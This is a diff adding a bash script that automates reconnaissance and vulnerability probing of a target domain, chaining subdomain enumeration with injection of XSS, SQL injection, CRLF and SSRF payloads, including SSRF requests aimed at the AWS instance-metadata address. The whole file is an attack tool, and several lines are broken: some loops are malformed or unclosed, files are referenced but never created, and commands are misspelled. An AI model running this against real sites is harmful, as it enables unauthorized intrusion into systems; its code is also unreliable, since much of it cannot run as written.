@@ -1,0 +1,65 @@
+#!/bin/bash
+
+echo "initiating Passive recon on target"
+print "Run subdomain finding tool"
+curl -s https://crt.sh/?q/=%.$1/&output/=json | jq -r '.[].name_value' | sed 's/*.//g' | sort -u >> sub1.txt
+
+
+echo "Initiate Activerecon "
+
+subfinder -d $1 -o sub2.txt
+amass enum -d $1 -o sub3.txt
+sublist3r -d $1 -o sub4.txt
+
+echo "Initiate Subdomain bruteforcing"
+subfinder -d $1 -w /root/wordlist/subdomain.txt -o sub5.txt
+amass active -d  $1 -w /root/wordlist/subdomain.txt -o sub6.txt
+
+echo "Initiate Sorting the subdomains"
+cat sub.txt | sort -u | tee -a 
+
+
+echo "Resovling  the subdomains"
+cat SUBDOMAIN | httpx -silent > urls1.txt
+cat SUBDOMAIN | httprobe > urls2.txt
+cat SUBDOMAIN | sed 's/^/http:///' >> urls3.txt
+cat SUBDOMAIN | sed 's/^/https:///' >> urls4.txt
+
+cat urls.txt | sort -u | tee -a URLS
+
+echo "Initiate scanning for subdomain"
+cat SUBDOMAIN | xargs -I% sh -c 'dig @8.8.8.8 {} | grep "CNAME"' >> subdomain_takeover_check
+subjack  -c /root/fingerprints.json -ssl -w SUBDOMAIN
+
+echo "Initiate Scanning vfor BLC"
+cat URLS | xargs -I% sh -c 'blc % | grep "404"' >> BLC_Hijacking
+
+echo "Initiate path url xss"
+cat URLS | xargs -I% sh -c 'curl -sk "%/xsst<>" 2>&1 | grep -q "xsst<>" && echo "PATH xss %"' >> PATH_XSS
+
+echo "Initiate Reading the url from the waybackmachine"
+cat SUBDOMAIN | gau -subs >> GAU
+cat URLS | waybackurls >> WAYBACKURL
+
+echo "Initiate SORTING the url and filtering the paramter and js file"
+cat GAU WAYBACKURL | grep "=" | httpx -silent | grep "?" >> VULurl
+cat GAU WAYBACKURL | grep ".js$" | httpx -silent >> VULjs
+
+
+echo "Initiate XSS scanning"
+for pay in $(cat xsss.txt); do for url in $(cat URLS | qsreplace "$pay");do echo "$url" | xargs  -I% sh -c 'curl -sk "%" 2>&1 | grep -q "alert(1)" && echo "XSS VUL %"' >> XSS_URL
+
+echo "Initiate ERROR BASED SQLI scanning"
+for sqli $(cat sqliyaload.txt) ;do for url in $(cat URLS | grep "=" | gf sqli | httpx | qsrepalce "$sqli") ;do echo "$url" | xargs -I{} sh -c 'curl -sk "{}" 2>&1 | grep -q "mysql_fetch_array" && echo "Error based SQLI {}"' ;done >> ESQLI_URL
+
+echo "Initiate TIME BASED SQLI SCANNING"
+for sqli in $(cat sqlitime.txt) ;do for url in $(cat URLS) ;do echo "$url" | qsreplace "$sqli"| parallel -j 10 'time curl -s -I "%"' ;print "timebase sqli without payload" ;echo "$url" | parallel -j 10 'time curl -s -I "%"' ;done ;done >> TSQLI_URL
+
+echo "Initiate CRLF Injection"
+for crlf in $(cat crlfpayload.txt); do for url in $(cat URLS | grep "=" | qsreplace "$crlf"); do echo $url| xargs -I@ sh -c 'curl -sk -I "@" 2>&1 | grep -q "Set-Cookie:%20test=test" && echo "CRLF VUL @"' ;done ;done >> CRLF_URL
+
+echo "Initiate SSRF to access Metadata"
+for pay in $(cat SSRFmetadata.txt); do for url in $(cat URLS | gf ssrf | grep "=" | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I% sh -c 'curl -sk "%" 2>&1 | grep "compute.internal" && echo " ssrf aws metadata %"'
+
+                        
+
